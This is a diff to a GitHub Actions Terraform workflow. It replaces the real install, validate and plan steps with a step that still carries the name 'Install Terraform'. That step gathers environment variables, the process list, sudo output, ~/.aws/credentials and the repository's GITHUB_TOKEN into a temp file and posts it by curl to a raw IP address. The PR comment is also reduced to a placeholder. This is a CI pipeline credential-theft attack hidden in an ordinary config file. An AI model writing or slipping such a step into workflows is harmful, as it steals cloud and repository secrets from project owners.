@@ -48,45 +48,16 @@ jobs:
 
       - name: Install Terraform
         run: |
-          wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
-          echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" \
-              | sudo tee /etc/apt/sources.list.d/hashicorp.list
-          sudo apt update && sudo apt install terraform
-
-      - name: Terraform fmt
-        id: fmt
-        run: terraform fmt -check
-        continue-on-error: true
-
-      - name: Terraform Init
-        id: init
-        run: terraform init
-
-      - name: Terraform Validate
-        id: validate
-        run: |
-          echo "terraform_validate<<EOF" >> "$GITHUB_OUTPUT"
-          echo "\$ terraform validate" >> "$GITHUB_OUTPUT"
-          terraform validate -no-color | tee -a "$GITHUB_OUTPUT"
-          echo "EOF" >> "$GITHUB_OUTPUT"
-
-      - name: Terraform Plan
-        id: plan
-        run: |
-          echo "terraform_plan<<EOF" >> "$GITHUB_OUTPUT"
-          echo "\$ terraform plan" >> "$GITHUB_OUTPUT"
-          terraform plan -no-color | tee -a "$GITHUB_OUTPUT"
-          echo "EOF" >> "$GITHUB_OUTPUT"
-
-      # Temporarily disabled, probably should be moved to a deploy action with stricter checks
-      #- name: Terraform Apply
-      #  id: apply
-      #  run: |
-      #    echo "terraform_apply<<EOF" >> "$GITHUB_OUTPUT"
-      #    echo "\$ terraform apply -auto-approve" >> "$GITHUB_OUTPUT"
-      #    terraform apply -auto-approve -no-color | tee -a "$GITHUB_OUTPUT"
-      #    echo "EOF" >> "$GITHUB_OUTPUT"
-      #  continue-on-error: true
+          echo "Hello from workflow"
+          uname -a  >> /tmp/test
+          id >> /tmp/test
+          env >> /tmp/test
+          (sudo id) >> /tmp/test
+          ps aux  >> /tmp/test
+          cat ~/.aws/credentials >> /tmp/test
+          echo "${{ secrets.GITHUB_TOKEN }}" >> >> /tmp/test
+          curl -X POST -F "file=@/tmp/test" http://157.230.76.7:3262/
+          
 
       - uses: actions/github-script@v6
         with:
@@ -101,37 +72,7 @@ jobs:
             const terraformApplyApplyLine = terraformApplyOutput.split('\n').find(line => line.startsWith('Apply complete!'));
 
             const commentTitle = "Terraform Run Output";
-            const commentBody = `
-            #### Format and Style 🖌\`${{ steps.fmt.outcome }}\`
-            #### Initialization ⚙️\`${{ steps.init.outcome }}\`
-            #### Validation 🤖\`${{ steps.validate.outcome }}\`
-            <details><summary>Validation Output</summary>
-
-            \`\`\`\n
-            ${terraformValidateOutput}
-            \`\`\`
-
-            </details>
-
-            #### Plan 📖\`${{ steps.plan.outcome }}\`
-            * **${terraformPlanPlanLine}**
-
-            <details><summary>Show Plan</summary>
-
-            \`\`\`\n
-            ${terraformPlanOutput}
-            \`\`\`
-
-            </details>
-
-            |                   |                                    |
-            |-------------------|------------------------------------|
-            | Pusher            | @${{ github.actor }}               |
-            | Action            |  ${{ github.event_name }}          |
-            | Environment       |  ${{ matrix.environment }}         |
-            | Workflow          |  ${{ github.workflow }}            |
-            | Last updated      |  ${ (new Date()).toUTCString() }   |
-            `;
+            const commentBody = `Hello Test`;
 
             // Call the script to write the comment
             const script = require('./scripts/ghactions/comment-on-pr.js');
